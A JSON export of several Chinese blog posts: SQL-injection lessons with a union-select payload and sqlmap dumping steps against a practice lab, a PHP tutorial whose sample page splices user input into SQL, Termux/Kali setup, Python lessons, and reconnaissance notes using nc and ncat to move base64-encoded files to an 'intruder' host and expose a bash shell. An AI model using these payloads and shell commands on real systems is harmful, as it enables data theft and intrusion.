传入以下参数：\n1 -2\u0026#39; union select 1,group_concat(username),group_concat(password) from users --+ 返回结果：\n注：此方法在之前需要使用limit语法的地方也可尝试\n方法二：limit a,b 语法 适用情况：网站有输出长度限制\n与之前相同，在参数后面添加limit 0,1手动修改依次输出\n工具辅助注入 sqlmap 用法（使用Kali版本） 慢速通用版：\nSTEP1:sqlmap -u [目标url] --dbs也可使用sqlmap -u [目标url] --current-db\n前者获取目标网站的所有库名，后者获取当前数据库名\nSTEP2:sqlmap -u [目标url] -D [库名] --tables\n获取指定库里的表\nSTEP3:sqlmap -u [目标url] -D [库名] -T [表名] --columns\n获取指定表里的栏目\nSTEP4:sqlmap -u [目标url] -D [库名] -T [表名] -C xxx,xxx --dump\n获取表里指定栏目的数据\n完毕\n快速版（也需要分步添加参数）：\nsqlmap -u [目标url] --dbs --batch --threads 10 --technique U\n使用sqlmap查看目标网站的数据库库名，忽略错误，开10线程，使用union select注入目标网站\n补充：\n\u0026ndash;technique X 中后接参数的其他类型\nE = 报错注入 error based（无法发现报错位，但是数据库报错会出现）\nB = 布尔型注入 booled based（无法发现报错位，数据库闭合破坏也不出现，但是界面上只会出现有和没有东西两种情况）\nT = 布尔型时间盲注 time based（无法发现报错位，数据库闭合被破坏也不出现，界面上也没有出现消失东西的情况）\n略微引申：POST类型的注入 以靶场http://sqlilabs.njhack.xyz/Less-11/index.php为例\nSTEP1：随便提交数据，使用burp suite抓包\n输入账号：admin1 密码：admin1\n抓包得到post内容uname=admin1\u0026amp;passwd=admin1\u0026amp;submit=Submit\nSTEP2：使用sqlmap注入\nsqlmap -u http://sqlilabs.njhack.xyz/Less-11/index.php --data \u0026quot;uname=admin1*\u0026amp;passwd=admin1\u0026amp;submit=Submit\u0026quot; --current-db --batch --threads 10 --technique U\n注意：\u0026ndash;data后跟着的\u0026quot;\u0026quot;包裹字符串内容要在打击处用*做标记\n接下来的步骤略\n拓展知识 web渗透中目标不同的组合：\nWindows+iss+asp/aspx(asp.net)+access/mssql\nWindows+apache+php+mysql = wamp （一般使用软件进行集成化搭建）\nlinux+apache/nginx+php+mysql = lamp/lnmp （又可能使用宝塔或其他面板搭建）\nlinux+tomcat+java(jsp)+oracle/mysql\nlinux+nginx+python(django/flask/tornado/fastapi)+go(beego/gin)+mysql\n","date":"2025-11-28T20:07:03+08:00","permalink":"https://www.retr0.xyz/p/1.5-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-1/","title":"1.5 SQL注入系列-1"},{"content":"用户交互 基本结构 核心架构和输出操作 php的基本结构是这样的：\n1 2 3 \u0026lt;?php echo \u0026#34;Hello World!\u0026#34;; ?\u0026gt; 此处echo就相当于Python里的print输出\n且中间部分每行结尾一定一定要加;（因为真的很容易忘）\n变量 此外，再输出内容中如果有多个部分组成请用英文句号.隔开（相当于python中print里的逗号全部换成句号，仅此而已）例如：\n1 2 3 4 \u0026lt;?php $a = \u0026#34;Hi!\u0026#34;; echo $a.\u0026#34;Hello!\u0026#34;; ?\u0026gt; if 判断 Quickstart：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php // 定义一个简单的变量 $age = 18; // if判断：如果$age大于等于18，执行花括号里的代码 if ($age \u0026gt;= 18) { echo \u0026#34;你已经成年啦！\u0026#34;; } // 再补一个if-else的简单例子 $score = 59; if ($score \u0026gt;= 60) { echo \u0026#34;考试及格啦！\u0026#34;; } else { echo \u0026#34;考试不及格，继续加油！\u0026#34;; } ?\u0026gt; 由此可见，它的基本结构是这样的：\n1 2 3 4 5 6 7 if (判断条件) { 语句块1; 语句块2; } else { 语句块1; 语句块2; } while 循环 Quickstart：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php // 初始化计数器 $i = 1; // while循环：只要$i小于等于5，就执行循环体 while ($i \u0026lt;= 5) { echo \u0026#34;当前数字是：{$i}\u0026lt;br/\u0026gt;\u0026#34;; // 计数器自增（必须写，否则会无限循环！） $i++; } ?\u0026gt; 由此可见，它的基本结构应该是这样的：\n1 2 3 4 while (循环判断条件) { 语句块1; 语句块2; } 变量格式 php中的变量没有数据类型，一律在变量名前面加上$，例如\n1 2 3 4 \u0026lt;?php $a = \u0026#34;Hi!\u0026#34;; echo $a; ?\u0026gt; GET 命令 使用GET命令可以获取用户输入的信息并赋值给变量，例如：\n1 2 3 4 \u0026lt;?php $a = $_GET[\u0026#39;name\u0026#39;]; echo $a; ?\u0026gt; 然后php可以通过地址(url)获取变量值，例如：\nhttp://localhost/index.php?name=example\n那如果有多个变量呢？\n1 2 3 4 5 6 \u0026lt;?php $a = $_GET[\u0026#39;name\u0026#39;]; $b = $_GET[\u0026#39;job\u0026#39;]; echo $a; echo \u0026#34;你的工作是\u0026#34;.$b; ?\u0026gt; http://localhost/index.php?name=example\u0026amp;job=xxx即可\n尤其注意： 在php文件后加上?变量名1=变量值1\u0026amp;变量名2=变量值2的格式\nPOST 命令 很简单，把上面的GET全改为POST就行了\n1 2 3 4 \u0026lt;?php $a = $_POST[\u0026#39;name\u0026#39;]; echo $a; ?\u0026gt; 不过这时候需要我们手动去提交POST，像这样：\n数据库交互之增删改查 登录phpmyadmin(http://localhost/phpmyadmin)创建一个示例数据库并随便写几条示例数据进去，过程略\n连接数据库 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接 $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } ?\u0026gt; 操作：查 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库查询语句================================================================ //准备一条数据库语句 $sql = \u0026#34;select * from db1 where id \u0026lt; 3\u0026#34;; // 这里相当于把查询指令赋值给$sql // 执行sql语句并返回给变量 $result = $conn-\u0026gt;query($sql); // 判断result里是否有东西 if($result-\u0026gt;num_rows\u0026gt;0){\t// $result-\u0026gt;num_rows获取结果集中的行数 // 输出数据 while($row = $result-\u0026gt;fetch_assoc()){\t// 每次从结果集中读取一行数据，并以关联数组形式返回 echo $row[\u0026#39;id\u0026#39;].\u0026#39;-----\u0026#39;.$row[\u0026#39;uid\u0026#39;].\u0026#39;-----\u0026#39;.$row[\u0026#39;job\u0026#39;].\u0026#39;\u0026lt;br/\u0026gt;\u0026#39;; } }else{ echo \u0026#34;无结果\u0026#34;; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; 特别的，这里使用的sql语句格式为\u0026quot;select * from 数据表名 where 筛选条件\u0026quot;\n操作：增 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库增语句============================================================== //准备一条数据库语句 $sql = \u0026#34;insert into db1(uid,pwd,job) values(\u0026#39;u5\u0026#39;,\u0026#39;666\u0026#39;,\u0026#39;driver\u0026#39;)\u0026#34;; // 这里相当于把增加指令赋值给$sql if($conn-\u0026gt;query($sql)===true){ echo \u0026#34;新纪录插入成功\u0026#34; }else{ echo \u0026#34;插入失败\u0026#34;.$conn-\u0026gt;error; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; 特别的，这里使用的sql语句格式为:\n\u0026quot;insert into 数据表名(关键字1,关键字2,关键字3) values('值1','值2','值3')\u0026quot;\n操作：改 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库修改语句============================================================== //准备一条数据库语句 $sql = \u0026#34;update db1 set pwd=\u0026#39;mima\u0026#39; where uid=\u0026#39;u2\u0026#39;\u0026#34;; if($conn-\u0026gt;query($sql)===true){ echo \u0026#34;修改成功\u0026#34; }else{ echo \u0026#34;修改失败\u0026#34;.$conn-\u0026gt;error; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; 特别的，这里使用的sql语句格式为:\n$sql = \u0026quot;update 数据表名 set 关键字1=值1 where 关键字2=值2\u0026quot;\n此处关键字1是实际修改内容，关键字2是用来定位要修改的条目\n操作：删 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库删除语句============================================================== //准备一条数据库语句 $sql = \u0026#34;delete from db1 where uid=u4\u0026#34;; if($conn-\u0026gt;query($sql)===true){ echo \u0026#34;删除成功\u0026#34; }else{ echo \u0026#34;删除失败\u0026#34;.$conn-\u0026gt;error; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; 特别的，这里使用的sql语句格式为:\n$sql = \u0026quot;delete from 数据表名 where 关键字1=值1\u0026quot;\n问题排查 数据库连接相关错误（最基础也最常见） 连接参数配置错误 触发方式：修改 $servername / $username / $password / $dbname 中的任意值，与数据库实际配置不匹配。 例：把 $dbname = \u0026quot;test\u0026quot; 改成 $dbname = \u0026quot;test123\u0026quot; （数据库不存在）；把 $password = \u0026quot;root\u0026quot; 改成 $password = \u0026quot;123456\u0026quot; （密码错误）。\n问题表现：页面直接输出“连接失败”+ 具体错误信息（如 Unknown database \u0026rsquo;test123\u0026rsquo; 或 Access denied for user \u0026lsquo;root\u0026rsquo;@\u0026rsquo;localhost\u0026rsquo; (using password: YES) ）。\n问题根源：数据库连接的核心参数（地址、账号、密码、库名）必须与目标数据库完全一致，一旦 mismatch 就会连接失败。初学者常因“本地环境与服务器环境配置不同”“手误输错库名”踩坑。\n未设置字符编码导致中文乱码 触发方式：数据库表/字段包含中文字符，且代码中未添加字符集设置。\n问题表现：查询结果中的中文显示为 ??? 或乱码。\n问题根源：MySQL 数据库默认字符集可能为 latin1 ，而 PHP 页面通常用 UTF-8 ，两者编码不匹配导致中文无法正常解析。代码中缺少字符集设置语句，是初学者最容易忽略的点。\n如何触发：在数据库 db1 表的 job 字段中存入“程序员”“设计师”等中文字符，直接运行原代码，会发现中文乱码。\nSQL 执行相关错误（隐性且易导致后续逻辑崩溃） SQL 语法/表名/字段名错误，导致 query() 返回 false 触发方式：修改 SQL 语句中的关键字、表名或字段名，导致 SQL 语法无效。 例1：把select * from db1 where id \u0026lt; 4 改成 selec * from db1 where id \u0026lt; 4（ select 拼写错误）；\n例2：把 db1 改成 db1_not_exist （表不存在）；\n例3：把 id \u0026lt; 4 改成 id \u0026lt;（语法不完整）。\n问题表现：页面报错 Trying to get property \u0026rsquo;num_rows\u0026rsquo; of non-object （试图访问非对象的 num_rows 属性）。\n问题根源： $conn-\u0026gt;query($sql) 执行失败时（SQL 语法错、表/字段不存在等），会返回 false （而非结果集对象）。原代码直接用 $result-\u0026gt;num_rows ，相当于给 false 加 -\u0026gt; ，违反 PHP 语法（只有对象才能用 -\u0026gt; ）。\nSQL 注入漏洞（安全层面的严重错误） 触发方式：将 SQL 中的硬编码条件（如 id \u0026lt; 4 ）改为拼接用户输入的变量。 例：把 $sql = \u0026quot;select * from db1 where id \u0026lt; 4\u0026quot; 改成：\n1 2 $user_input = $_GET[\u0026#39;id\u0026#39;]; // 假设用户输入：4 or 1=1 $sql = \u0026#34;select * from db1 where id \u0026lt; $user_input\u0026#34;; 问题表现：恶意用户可通过输入 4 or 1=1 等语句，查询表中所有数据（甚至修改/删除数据），导致数据泄露。\n问题根源：原代码用“字符串拼接”方式构造 SQL（虽然当前是硬编码，无风险，但一旦接入用户输入就会触发注入），未使用 MySQLi 的预处理语句（参数化查询），无法过滤恶意输入。\n结果处理相关错误（逻辑疏忽导致） 字段名与代码访问名不匹配 触发方式：修改 $row['id'] / $row['uid'] / $row['job'] 中的字段名，或修改数据库表的字段名。 例：数据库表中字段名是 uid 而非 uid ，但代码中仍写 $row[\u0026lsquo;userid\u0026rsquo;] ；或把 $row[\u0026lsquo;job\u0026rsquo;] 改成 $row[\u0026lsquo;work\u0026rsquo;] 。\n问题表现：页面输出空值（ \u0026rsquo;\u0026rsquo; ）或报错 Undefined index: uid （未定义索引 uid ）。\n问题根源： fetch_assoc() 返回的关联数组，键名必须与数据库表的实际字段名完全一致（大小写敏感，取决于数据库配置），一旦拼写错误或字段名修改后未同步代码，就会出现索引不存在的错误。\n循环中变量覆盖或未处理空结果集的边界情况 触发方式：在循环外定义了同名变量 $row ，或修改 num_rows 的判断逻辑。 例：在 while 循环前添加 $row = [\u0026lsquo;id\u0026rsquo; =\u0026gt; 100]; ，会导致第一次循环覆盖初始值；或把 if($result-\u0026gt;num_rows\u0026gt;0) 改成 if($result-\u0026gt;num_rows) （看似等价，但如果 num_rows 为 0 时没问题，若 result 为 false 则报错，与前面 SQL 执行错误叠加）。\n问题表现：数据输出异常（首行数据错误）或报错（如前面提到的非对象访问）。\n问题根源：变量作用域未隔离（同名变量覆盖），或对 $result 的合法性判断不完整（只判断了行数，未判断 $result 是否为对象）。\nphp和html混写实现网页美化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;测试网页\u0026lt;/title\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库查询语句 $userinput = $_GET[\u0026#39;num\u0026#39;]; //准备一条数据库语句 $sql = \u0026#34;select * from db1 where id \u0026lt;= $userinput\u0026#34;; // 这里相当于把查询指令赋值给$sql // 执行sql语句并返回给变量 $result = $conn-\u0026gt;query($sql); // 判断result里是否有东西 if($result-\u0026gt;num_rows\u0026gt;0){\t// $result-\u0026gt;num_rows获取结果集中的行数 // 输出数据==================================================================== echo \u0026#34;\u0026lt;table border=\u0026#39;1\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;id\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;uid\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;job\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#34;; while($row = $result-\u0026gt;fetch_assoc()){\t// 每次从结果集中读取一行数据，并以关联数组形式返回 echo \u0026#34;\u0026lt;tr\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#39;id\u0026#39;].\u0026#34;\u0026lt;/td\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#39;uid\u0026#39;].\u0026#34;\u0026lt;/td\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;td\u0026gt;\u0026#34;.$row[\u0026#39;job\u0026#39;].\u0026#34;\u0026lt;/td\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;; } echo \u0026#34;\u0026lt;/table\u0026gt;\u0026#34;; }else{\t//======================================================================= echo \u0026#34;无结果\u0026#34;; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 分割线之间及代码头尾处有改动，分割线见主要实现了数据放置在表格中\n命令行连接数据库 打开C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\bin\n在此处启动CMD\n下面是一些常用命令：\nmysql -uroot -proot\t登录数据库\nshow databases;\t查看所有的库名\nuse xxx\t使用(定位)xxx这个库名\nshow tables;\t查看库中有什么表\nselect * from xxx\t查看xxx这张表里的所有数据\n此外所有php里的sql语句都可以在命令行之间使用\n","date":"2025-11-26T23:11:40+08:00","permalink":"https://www.retr0.xyz/p/1.4-php%E5%9F%BA%E7%A1%80%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%A4%E4%BA%92/","title":"1.4 php基础：用户交互与数据库交互"},{"content":"获取termux 由Termux官网指引，我们可以从官方Github软件仓库下载最新版本，链接如下：\nGitHub - termux/termux-app: Termux - a terminal emulator application for Android OS extendible by variety of packages.\n安装相应版本即可\n安装Kali 打开termux（打开之后不要切换目录，在当前目录下执行以下命令） pkg update 更新依赖，类似于更新以安装的软件(依赖更新检查完成之后会有一个让你确认是否继续更新的操作，我们输入y就可以了） 1 pkg update pkg upgrade升极版本，这个相比较上个命令，更新的是系统版本 1 pkg upgrade 申请存储访问权限 termux-setup-storage（这个命令可以是我们能使用termux向手机写入数据） 1 termux-setup-storage 安装 pkg install wget（用来下载文件的命令） 1 pkg install wget (因为我已经安装过了，所以显示的是这个) 下载 安装脚本wget -O install-nethunter-termux https://offs.ec/2MceZWr （这个是用来安装kaili的脚本，这个是重点，因为系统的镜像是在这里下载的，我们需要耐心的等待下载完成） 1 wget -O install-nethunter-termux https://offs.ec/2MceZWr 然后就得到了这样一个文件\n给脚本执行权限chmod +x install-nethunter-termux （这样我们可以执行这个脚本\u0026rsquo;x\u0026rsquo;是执行权限） 1 chmod +x install-nethunter-termux 运行安装脚本 ./install-nethunter-termux 1 ./install-nethunter-termux 然后会出现一个kali的banner，等待下载完成（要有耐心，和一个流畅的网络，中途可能会下载失败，我们只需要重新开始就行了 因为wget 加上了O选项，所以会继续上次的下载位置，若是下载完成，但是不能安装系统，多半是系统安装包被命名其他的名字或者是下载的确是失败了）\n下载完成之后，执行 ./install-nethunter-termux,等待一阵之后，安装完成。\nnethunter（或者缩写nh） 开启 kalilinux命令行，注意开启的是普通权限的命令行\nnethunter -r 开启的是管理员的命令行\nnh kex\t打开vnc图形化界面（普通权限）首次使用需要配置密码（还会问你要不要设一个仅观看的vnc密码，自行选择是否启用）\nnh kex stop\t停止桌面服务\n使用VNC连接可视化界面 下载安装app：VNC Viewer ，下载地址：VNC-Viewer 蓝奏云\n在Termux中输入以下指令启动图形化界面：\n1 nh kex 这时会下面会输出地址和端口，一般为127.0.0.1:5901\n在VNC中填写地址和端口后设置画质为高画质后点击连接\n要求输入密码，填写你创建的密码即可\n问题解决：VNC服务停止，输出Process-completed-signal-9 简述 使用Termux安装Kali发行版，用RealVNC Viewer登入系统，没过几秒就会收到The connection closed unexpectedly的警告！\n接着回到Termux，看到终端机显示[Process completed (signal 9) - press Enter]的错误，原来是Termux的行程被Android系统中止了，但是手机RAM明明还够用啊？\n此问题源自于Android 12引入的新机制，下面简述原因，以及提供暂时的解决方法。\nTermux发生signal 9错误的原因：agnostic-apollo在Phantom, Cached And Empty Processes一文中详述了Android 12引进的新机制。Android系统将会监控APP所fork出来的子行程，并在达到32个以上子行程后将其终止，避免占用过多CPU资源。\n此一机制称为\u0026quot;Phantom Processes Killing\u0026quot;，因为开发者最害怕看到这种情况，得名影子行程杀手。\n在开发者要求下，Google于Android 12L以及Android 13以上版本加入了关闭Phantom Processes Killing的选项settings_enable_monitor_phantom_procs，然而使用者还是要手动使用ADB指令关闭。因此这是Google Android的问题，Temrux开发者尚未找到正式解决办法，下面指令停用的办法是agnostic-apollo提出的。\n以Termux来说，Phantom Processes Killing会导致Termux执行指令的时候被系统随机中止。Proot distro若要跑图形环境自然就会制造更多子行程了吧。尤其在切换到后台，要用VNC Viewer连线的时候，就会触发Phantom Processes Killing，不管手机RAM有多大。接著回到Termux便会看到[Process completed (signal 9) - press Enter]的错误讯息。\n解决Termux的signal 9错误执行指令将Phantom Processes Killing停用即可，虽然会导致某些APP的背景行程跟著不受控制。\n以下假定Android手机皆有安装Google Play服务框架，因为GMS会不定时覆写装置设定，所以要一并将其关闭。然而关闭GMS覆写可能会导致手机卡开机。\n如果手机没有Root权限 点击下载Windows版adb工具包并且解压缩。\n进入platform_tools目录，会看到ADB和Fastboot的执行档。在这里按SHIFT + 右键，开启终端机(或Powershell)。\n手机开启系统设定→关于手机，版本号码点5下，之后搜寻“开发人员选项”进去开启“ADB侦错”。\n将手机插上电脑，于Windows的终端机输入以下指令，在手机上同意侦错。\n1 adb devices\t检测设备 接著按照Android版本，执行以下指令：\nAndroid 12L和Android 13：\n1 /adb shell \u0026#34;settings put global settings_enable_monitor_phantom_procs false\u0026#34; Android 12：\n1 adb shell \u0026#34;/system/bin/device_config set_sync_disabled_for_tests persistent; /system/bin/device_config put activity_manager max_phantom_processes 2147483647\u0026#34; 执行reboot或手动重启，完成。\n如果手机有Root权限 开启Termux，切换到su，取得root权限\n1 su #取得root权限 按照Android版本执行指令。\nAndroid 12L和Android 13以上：\n1 su -c \u0026#34;settings put global settings_enable_monitor_phantom_procs false\u0026#34; Android 12：\n1 su -c \u0026#34;/system/bin/device_config set_sync_disabled_for_tests persistent; /system/bin/device_config put activity_manager max_phantom_processes 2147483647\u0026#34; 执行reboot或手动重启，完成。\n","date":"2025-11-25T23:23:58+08:00","image":"https://www.retr0.xyz/post/kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/termux.webp","permalink":"https://www.retr0.xyz/p/%E6%95%99%E7%A8%8B%E5%90%91%E5%9F%BA%E4%BA%8Etermux%E5%9C%A8%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85kali/","title":"[教程向]基于Termux在安卓手机上安装Kali"},{"content":"本章共有三个练习，如下所示：\n练习一：2020年印美日新冠累计确诊人数 练习二：全国疫情地图可视化 练习三：动态GDP增长图 数据来源 练习数据全部来自《百度疫情实时大数据报告》，及公开的全球各国GDP数据\n使用的技术 Echarts 是个由百度开源的数据可视化,凭借着良好的交互性,精巧的图表设计,得到了众多开发者的认可。而 Python是门富有表达力的语言,很适合用于数据处理. 当数据分析遇上数据可视化时 pyecharts 诞生了。\n所以，现在安装pyecharts模块\n1 pip install pyecharts ","date":"2025-11-25T22:37:43+08:00","permalink":"https://www.retr0.xyz/p/10.1-%E7%BB%83%E4%B9%A0%E5%BA%8F/","title":"10.1 练习：序"},{"content":"信息搜集 本地信息搜集(Windows 命令) whoami\t查看自己身份\nwhoami /all\t获取当前域的信息\nipconfig\t获取ip地址信息\nipconfig /all\t获取详细的ip地址信息\n查询结果：[所在域-计算机名-账户名]\narp -a\t查询arp表\necho %PROCESSOR_ARCHITECTURE% 查看CPU架构\nsysteminfo\t查看操作系统信息\nwmic product\t查看安装的软件\nwmic product get name,version\t查看安装的软件和版本信息\nnet user\t查看本地用户\nnet session\t查看本地和远程的会话\nnet view\t查看内网的共享情况\nnet share\t查看自己共享了哪些东西\n远程信息搜集(Kali 命令) 什么样的服务器有入侵价值？\n有有价值的网站 seo.chinaz.com 查看seo信息，权重，ip访问量\n上面有庞大数据库的服务器 mssql mysql oracle redis\u0026hellip;\n性能优秀的服务器 高性能CPU，显卡，硬盘\n保有某些单位机密的服务器 nping --tcp -p 80 --flag syn 2 [目标ip]\n测试对方端口是否开放\nnc -nvz [目标ip] 1-65535\n使用nc查看对方端口是否开放\nnetdiscover -i [网卡名称] -r 192.168.x.0/24\n搜集内网用户的信息\narping [参数] [目标]\n使用arp扫描\n-i 指定网卡\n-c 发包数量\n-s 源mac\n-S 源ip\nnbtscan\n使用 netbios 协议进行信息搜集（Windows之间使用）\n通过计算机名解析对应ip\nwhatweb [网址]\n初步分析网站结构\nnc用法追加 文件传输（常规） 先启动发送 发送端：nc -l -p [端口号] \u0026lt;文件\n接收端：nc [发送端ip] [端口号] \u0026gt;文件\n先启动接收 接收端：nc -l -p [端口号] \u0026gt;文件\n发送端：nc [发送端ip] [端口号] \u0026lt;文件\n文本传输（加密） 目标机：\ncat [目标文件] | base64 | nc -nv [入侵机ip] [端口号] -q 1\n入侵机：\nnc -l -p [端口号] \u0026gt;文件\n文件传输（两台都是Linux且有一方没有nc） 目标机：\nwhois -h [入侵机ip] -p [端口号] cat [文件] | base64``\n入侵机：\nnc -l -v- p [端口号] | sed \u0026quot;s/ //g\u0026quot; | base64 -d\n加密通信（两台都是Linux） 使用ncat\n目标机：\nncat -c bash --all [入侵IP] -vnl [port] --ssl\n入侵机：\nncats -nv [目标IP] [port] --ssl\n","date":"2025-11-25T10:56:43+08:00","permalink":"https://www.retr0.xyz/p/1.3-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"1.3 信息搜集工具的使用"},{"content":"自定义Python包 什么是Python包 从物理上看，包就是一个文件夹，在该文件夹下包含了一个__init__.py文件，该文件夹可用于包含多个模块文件。\n从逻辑上看，包的本质依然是模块\n包的作用： 当我们的模块文件越来越多时，包可以帮助我们管理这些模块，包的作用就是包含多个模块，但包的本质依然是模块。\n包的创建 Quickstart：\n在Pycharm中右键新建Python软件包(Python Package)my_packages 自动生成__init__.py 新建包内模块：my_module1和my_module2 模块内代码如下 1 2 3 4 5 # my_module1模块中 print(1) def info_print1(): print(\u0026#39;my_module1\u0026#39;) 1 2 3 4 5 # my_module2模块中 print(2) def info_print2(): print(\u0026#39;my_module2\u0026#39;) 包的导入 方式一： 导入：import 包名.模块名\n调用：包名.模块名.目标\n方式二： 导入：from 包名 import 模块\n调用：模块名.目标\n补充：__main__变量的使用\n在__init__.py文件中写入__main__=[xxx,xxx]即可控制通过from xxx import *导入时的模块\n第三方包 在Python程序的生态中,有许多非常多的第三方包(非Python官方),可以极大的帮助我们提高开发效率,如\n· 科学计算中常用的:numpy包\n· 数据分析中常用的:pandas包\n· 大数据计算中常用的:pyspark、apache-flink包\n· 图形可视化常用的:matplotlib、pyecharts\n, 人工智能常用的:tensorflow\n· 等\n这些第三方的包,极大的丰富了Python的生态,提高了开发效率。\n但是由于是第三方,所以Python没有内置,所以我们需要安装它们才可以导入使用\n安装第三方包-pip 常规 按win+R后输入 cmd 回车或使用其他方法打开命令提示符。\n使用命令：pip install [包名称]\n网络优化 使用命令：\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple [包名称]\n此处使用清华镜像源，也可以根据需要选择其镜像源\n1 2 3 4 5 6 以下是一些常用的国内镜像源地址，可根据需求选择： 清华大学: https://pypi.tuna.tsinghua.edu.cn/simple 阿里云: https://mirrors.aliyun.com/pypi/simple 中国科学技术大学: https://pypi.mirrors.ustc.edu.cn/simple 腾讯云: https://mirrors.cloud.tencent.com/pypi/simple 华为云: https://repo.huaweicloud.com/repository/pypi/simple ","date":"2025-11-24T21:59:02+08:00","permalink":"https://www.retr0.xyz/p/9.3-%E5%8C%85/","title":"9.3 包"},{"content":"【人物特写】山上彻野：她长得像妈妈却已不再是妈妈 【前传】 神权绞杀下的家破人亡 黄金时代的碎影 1980年的日本，昭和余晖尚未散尽，经济泡沫催生的繁荣仍笼罩着列岛。山上彻野降生在奈良一个精英家庭：外祖父是建筑公司老板兼拳击协会会长，家底殷实；父亲毕业于京都大学，是建筑界的青年才俊。彼时的家，是昭和梦的缩影——安稳、体面，满是对未来的期许。\n命运的裂痕在彻野4岁时骤然撕开。1984年，不堪工作重压与人际倾轧的父亲，以跳楼自杀的方式告别了这个世界。年轻的母亲一夜沦为寡妇，独自扛起抚养重病哥哥、懵懂彻野与襁褓中妹妹的重担。那一天，彻野眼中的阳光，一半随父亲沉入黑暗。\n邪教织就的地狱网 家庭的崩塌让母亲的精神防线彻底溃败。1991年，在一名教徒的诱骗下，她一头扎进了 「统一教」 